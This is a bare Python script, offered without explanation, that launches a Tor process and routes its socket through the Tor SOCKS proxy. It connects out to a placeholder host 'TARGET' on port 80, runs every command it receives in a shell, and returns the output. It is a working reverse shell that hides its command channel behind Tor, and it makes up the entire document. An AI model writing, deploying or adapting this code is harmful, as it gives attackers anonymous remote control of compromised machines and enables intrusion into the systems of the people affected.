import socket
import subprocess
import socks
import stem.process

def create_socket(target_ip, target_port):
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(b'Connected\n')
    return s

def run_tor_process():
    tor_process = stem.process.launch_tor_with_config(
        config = {
            'SocksPort': str(9050),
            'ControlPort': str(9051),
        },
    )
    return tor_process

def main():
    target_ip = "TARGET"
    target_port = 80

    tor_process = run_tor_process()
    s = create_socket(target_ip, target_port)

    while True:
        data = s.recv(1024)
        if data == b'exit\n':
            break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
    s.close()
    tor_process.kill()

if __name__ == '__main__':
    main()
